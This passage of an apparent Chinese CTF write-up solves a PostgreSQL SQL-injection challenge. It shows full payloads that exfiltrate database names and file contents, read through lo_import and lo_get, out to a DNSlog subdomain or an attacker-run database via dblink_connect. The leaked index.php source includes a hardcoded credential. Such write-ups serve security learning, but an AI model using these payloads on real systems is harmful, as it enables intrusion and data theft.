id="方法一：延时注入"><a href="#方法一：延时注入" class="headerlink" title="方法一：延时注入"></a>方法一：延时注入</h3><p> postgrest数据库中的延时函数有<code>pg_sleep()</code>/<code>pg_sleep_for()</code>/<code>pg_sleep_until()</code></p><p>查阅资料得知：</p><blockquote><p>pg_sleep(seconds)<br>pg_sleep_for(interval)<br>pg_sleep_until(timestamp with time zone)</p><p>pg_sleep让当前的会话进程休眠seconds 秒以后再执行。seconds是一个double precision 类型的值，所以可以指定带小数的秒数。<br>pg_sleep_for 对于指定为interval的较长睡眠时间是一个便利函数。<br>pg_sleep_until在需要特定唤醒时间时比较便利。</p><p>SELECT pg_sleep(1.5);<br>SELECT pg_sleep_for(‘5 minutes’);<br>SELECT pg_sleep_until(‘tomorrow 03:00’);</p></blockquote><p>当时比赛脚本参考 <a href="https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/exp.py">balsn</a></p><p>这里不做阐述，因为最终得出结果</p><pre class="language-none"><code class="language-none">version: (Debian 11.2-1.pgdg90+1)current_db: docker_dbcurrent_schema: publictable of public: searchescolumns of searches: id,searchcounts of searches:0</code></pre><p><code>searches</code>表为空，所以本题应读取文件</p><h3 id="方式二：信息带外"><a href="#方式二：信息带外" class="headerlink" title="方式二：信息带外"></a>方式二：信息带外</h3><p>利用DNSlog方式</p><p>在PostgreSQL中，存在dblink模块，可以外联数据库或者当前数据库，dblink_connect同时会对host进行DNS查询，利用查询给定DNS的子域名，再查DNS解析记录即可获取传递的信息，这里用<a href="http://ceye.io/">ceye</a>来记录</p><p>首先看看dblink模块有没有开启</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;&#39;)) --</code></pre><p>没有报错，说明可以操作继续尝试</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;host&#x3D;&#39; || (SELECT current_database()) || &#39;.xxxx.ceye.io user&#x3D;a password&#x3D;a dbname&#x3D;a&#39;)) --</code></pre><p>xxxx是ceye个人的 Identifier ，可见成功返回了当前数据库名</p><img src="/article/cqb2021/image-20210201195343606.png" class="" title="ceye" loading="lazy"><p>原理是通过<code>.</code>连接，让pgsql去解析host即给定DNS的子域名，从而带出信息。顺着这个方法可以带出来部分信息</p><p>接着就要考虑如何文件包含了，在这里原WP写的很清楚</p><blockquote><p>我们可能确实需要从中窃取数据<code>/var/lib/postgresql/data/secret</code>。不幸的是，如果我们尝试使用<code>pg_read_file</code>或<code>pg_read_binary_file</code>读取文件，则不会获得传入连接，因此当前用户可能无权使用这些功能。</p><p>读取文件的替代方法是使用<a href="https://www.postgresql.org/docs/11/lo-funcs.html">大对象</a>。我们可以用来<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。</p></blockquote><p> 当前用户为docker，不够权限执行系统管理员才能执行的函数<code>pg_read_file()</code>, <code>pg_ls_dir()</code> or <code>pg_stat_file()</code> ，也不方便写udf，没有写权限。</p><p>下面截取原WP的部分内容：</p><blockquote><p>碰到这种情况也就是需要绕过的时候的做法，一般都是谷歌百度，然后阅读文档，另外可以自己起一个环境去搜索相关的函数。例如在这里，balsn的做法是另外起一个环境：</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%file%&#39;;   查询所有带有file的函数pg_stat_get_db_temp_files pg_walfile_name_offset pg_walfile_name pg_rotate_logfile_old pg_read_file_old pg_read_file pg_read_file pg_read_file pg_read_binary_file pg_read_binary_file pg_read_binary_file pg_stat_file pg_stat_file pg_relation_filenode pg_filenode_relation pg_relation_filepath pg_show_all_file_settings pg_hba_file_rules pg_rotate_logfile pg_current_logfile pg_current_logfile</code></pre><p>但是这些函数都似乎没起作用</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%read%&#39;;   查阅带有read的函数loread pg_stat_get_db_blk_read_time pg_read_file_old pg_read_file pg_read_binary_file</code></pre><p>可以看到第一个方法，通过查阅文档（学会阅读文档很重要！）</p><p>loread是面向SQL的大对象函数，比如<code>lo_from_bytea</code>，<code>lo_put</code>，<code>lo_get</code>，<code>lo_creat</code>, <code>lo_create</code>,</p><pre class="language-none"><code class="language-none">lo_unlink&#96;， &#96;lo_import&#96;和 &#96;lo_export</code></pre><p> 服务器端的<code>lo_import</code>和 <code>lo_export</code>函数和客户端的那几个有着显著的不同。 这两个函数在服务器的文件系统里读写文件， 使用数据库所有者的权限进行。 因此，只有超级用户才能使用他们。相比之下，客户端的输入和输出函数在客户端的文件系统里读写文件， 使用客户端程序的权限。客户端函数不需要超级用户权限。<br><code>lo_read</code>和<code>lo_write</code>的功能通过服务器端调用可用， 但是服务器端函数名不同于客户端接口，因为他们不包含下划线。你必须作为<code>loread</code>和<code>lowrite</code> 调用这些函数。 </p><p>在将服务器端lo_import和lo_export函数授权给非超级用户时需要仔细考虑安全隐患。 具有此类权限的恶意用户可以轻松地将其变为超级用户（例如，通过重写服务器配置文件），或者可以攻击服务器的其余文件系统，而无需获取数据库超级用户权限。 因此，对这两个函数的权限授予必须谨慎。</p></blockquote><p>回到题目中来，lo_import方法可以读取文件为postgres对象，原准备利用lo_export写文件，可是应该是没有权限</p><p>我们先包含<code>index.php</code>看看源码</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p><strong>请注意！请注意！请注意！</strong>错误写法：</p><p><code>./?f=gyy&#39; union select 1,(select dblink_connect(&#39;host=&#39; || (select lo_import(&#39;/var/www/html/index.php&#39;)) || &#39;.xxxx.ceye.io user=a password=a dbname=a&#39;)) --</code></p><p>表面上确实返回了oid</p><img src="/article/cqb2021/image-20210201200309775.png" class="" title="DNSlogoid" loading="lazy"><p>但是，在 dblink下 lo_import只是在vps上的 生效，并没有实际包含，在方式三会有实验证明，在最后有对注入点的解释。</p><p>然后接下来发现，这里利用DNSlog进行信息外带还有的问题是要遵循DNS协议，最大位数不超过63位，且不能有任何特殊符号及空格回车之类的，只能用<code>substring</code>函数一段一段截取，还得<code>replace</code>替换字符，可以完成但非常麻烦，不推荐使用。</p><h3 id="方式三：数据库外联"><a href="#方式三：数据库外联" class="headerlink" title="方式三：数据库外联"></a>方式三：数据库外联</h3><p>为了更好理解，下面先进行实验测试，dblink下 lo_import只是在vps上的 生效，并没有实际包含，详情可见如下</p><hr><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>服务器或本地起一个pgsql服务，可以安装，也可以docker起一个记得开端口映射，然后将其中的<code>postgresql.conf</code>中设置<code>listen_addresses = &#39;*&#39;</code>以监听。然后运行tcpdump监听端口流量</p><pre class="language-none"><code class="language-none">sudo tcpdump -nX -i eth0 port 5432</code></pre><p>默认端口为5432</p><p>dblink下包含文件</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;|| (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)) )) --</code></pre><img src="/article/cqb2021/image-20210201215153531.png" class="" title="oid" loading="lazy"><p>返回oid16438，我们读取一下所有oid列表看一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><p>没有报错，同时，<strong>没有任何数据返回</strong></p><p>而我们直接包含<code>index.php</code>试一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>没有报错，再查一下oid列表</p><img src="/article/cqb2021/image-20210201220913327.png" class="" title="oid2" loading="lazy"><p>有数据返回，同时可见16439和16440，而16438并没有在列表中，读取16438数据没有返回，读取16439与16440正常返回</p><p>可见dblink下lo_import在本地是不生效的</p><hr><p>这是原WP里的错误，原因在于其flag文件本身就已经包含在大对象里，所以直接就可查询，而dblink状态下并没有生效，算是这次比赛这道题目的最大收获吧。</p><p>如实验所示，流程如下，IP记得替换成自己的</p><p>首先起服务如实验中所示</p><p>先将<code>index.php</code>包含进来，看看有没有线索</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (SELECT lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>然后读取全部oid列表</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202011754628.png" class="" title="oid3" loading="lazy"><p>（多按几下就会有多个oid，见谅…）</p><p>然后读<code>index.php</code>的oid读取数据，这里可以直接读，lo_get数据转码为UTF-8，然后替换换行符(chr(10))再替换空格(chr(32))即可明文读取</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT replace(replace(substring(convert_from(lo_get(16440),&#39;utf8&#39;),1,900),chr(10),&#39;&#39;),chr(32),&#39;&#39;)) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202004121305.png" class="" title="index" loading="lazy"><p>当然看不清可以base64读取自己转</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;||(SELECT replace(substring(encode(lo_get(16440),&#39;base64&#39;),1,900),chr(10),&#39;&#39;)))) --</code></pre><img src="/article/cqb2021/image-20210201200655345.png" class="" title="base64index" loading="lazy"><p>得到<code>index.php</code>源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);session_start();function is_mobile()&#123;    if (isset ($_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;        $clientkeywords &#x3D; array(            &#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;        );        if (preg_match(&quot;&#x2F;(&quot; . implode(&#39;|&#39;, $clientkeywords) . &quot;)&#x2F;i&quot;, strtolower($_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;            return true;        &#125;    &#125;    return false;&#125;if (!is_mobile()) &#123;    die(&quot;&lt;!--function is_mobile()&#123;--&gt;&lt;!--if (isset (\$_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;--&gt;&lt;!--\$clientkeywords &#x3D; array(--&gt;&lt;!--&#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;--&gt;&lt;!--);--&gt;&lt;!--&#x2F;&#x2F;HTTP_USER_AGENT¸­--&gt;&lt;!--if (preg_match(\&quot;&#x2F;(\&quot; . implode(&#39;|&#39;, \$clientkeywords) . \&quot;)&#x2F;i\&quot;, strtolower(\$_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;--&gt;&lt;!--return true;--&gt;&lt;!--&#125;--&gt;&lt;!--&#125;--&gt;&lt;!--return false;--&gt;&lt;!--&#125;--&gt;&quot;);&#125;$user_input &#x3D; $_GET[&#39;f&#39;];if ($_SESSION[&quot;sql_injection&quot;]) &#123;    $user_input2 &#x3D; $_SESSION[&quot;sql_injection&quot;];    if(preg_match(&quot;&#x2F;dblink&#x2F;i&quot;, $user_input2)) &#123;        if(preg_match(&quot;&#x2F;host&#x2F;i&quot;, $user_input2)) &#123;            $limit &#x3D; 1;        &#125;        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(connect_timeout ?&#x3D;)&#x2F;i&#39;, &#39;&#39;, $user_input);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(host&#x3D;)&#x2F;i&#39;, &#39;connect_timeout&#x3D;2 host&#x3D;&#39;, $user_input);&#x2F;&#x2F;        hack for tcpdump ,only dns        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(user&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(password&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);    &#125;    $dbconn &#x3D; pg_connect(&quot;host&#x3D;127.0.0.1 port&#x3D;5432 dbname&#x3D;docker_db user&#x3D;docker password&#x3D;aYRr45lTgN9I9LJcjcr0&quot;);    pg_query($dbconn, &quot;SET statement_timeout TO 0&quot;);    pg_query($dbconn, &quot;SET idle_in_transaction_session_timeout TO 20&quot;);    pg_query($dbconn, &quot;SET lock_timeout TO 20&quot;);    $sql &#x3D; &quot;SELECT * FROM searches WHERE search &#x3D; &#39;&quot;.$user_input2.&quot;&#39;&quot;;    try &#123;        if (pg_prepare($dbconn, &quot;my_query&quot;, $sql)) &#123;            $start &#x3D; microtime(true);            pg_send_query($dbconn, $sql);            $error &#x3D; 0;        &#125; else &#123;            pg_send_query($dbconn, &quot;SELECT id FROM searches WHERE search &#x3D; &#39;0&#39;&quot;);            $error &#x3D; 1;        &#125;    &#125; catch (Exception $e) &#123;        &#x2F;&#x2F; Do nothing    &#125;&#125;$_SESSION[&quot;sql_injection&quot;] &#x3D; $user_input;?&gt;</code></pre><p>好像没啥，根据 <code>hint：不是所有sql都叫PostgreSQL；flag在web目录下的某个文件里。</code> 确定，关键文件肯定在这里，于是继续尝试，读到了<code>.hatccess</code>，包含一下，再读一下</p><p><code>.htaccess</code></p><pre class="language-none"><code class="language-none">&lt;FilesMatch &quot;pushF1n4AnK&quot;&gt;  SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;AddType image&#x2F;jpeg .tank</code></pre><p>可疑文件<code>pushF1n4AnK</code>，读一下</p><img src="/article/cqb2021/image-20210201201204964.png" class="" title="flag" loading="lazy"><p>至此题目结束了</p><p>最后说一下注入点的问题</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><h4 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>对于DNSlog，注入点在host，即<code>... host=&#39;|| (query) ||&#39;.xxxx.ceye.io ...</code>，上面已解释过</p><h4 id="数据库外联"><a href="#数据库外联" class="headerlink" title="数据库外联"></a>数据库外联</h4><p>注入点在明文传输的部分，即<code>... user=&#39;|| (query) ||&#39;...</code>和<code>... dbname=&#39;||(query) &#39;</code>最后不需要<code>|</code>连接符，因为没有东西加了会报错</p><p>举例，例如在获取所有大对象oid时，在<code>user</code>处注，如图所示</p><img src="/article/cqb2021/image-20210202021430433.png" class="" title="inject" loading="lazy"><pre class="language-none"><code class="language-none">user.xxxx.database.postgres</code></pre><p>即<code>user</code>和<code>dbname</code>处都是明文传输的都可以注，而password不行</p><h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p>感谢 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬的教导，感谢 @egg 师傅的指导，以及和 @R1chm0nd 师傅赛后讨论指正payload中<code>user=&#39; || (query) || &#39;</code>的<code>|</code>或符合其实是连接符，学习了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p><p><a href="https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true">https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration">https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration</a></p><p><a href="https://balsn.tw/ctf_writeup/20190603-facebookctf/">https://balsn.tw/ctf_writeup/20190603-facebookctf/</a></p><p><a href="https://ha1c9on.top/2021/01/31/2021-cqb-write-up/">https://ha1c9on.top/2021/01/31/2021-cqb-write-up/</a> la佬博客，希望能和师傅一样强，能和师傅换友链</p><p><a href="https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed">https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed</a> (写udf的，没用上2333)</p><p><a href="http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY">http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY</a></p><p><a href="https://www.postgresql.org/docs/11/dblink.html">https://www.postgresql.org/docs/11/dblink.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;只做了一道题，按F注入，研究了pgsql，算个小笔记，不能算研究性文章&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="SQL" scheme="https://err0r.top/tags/SQL/"/>
    
  </entry>
  
</feed>
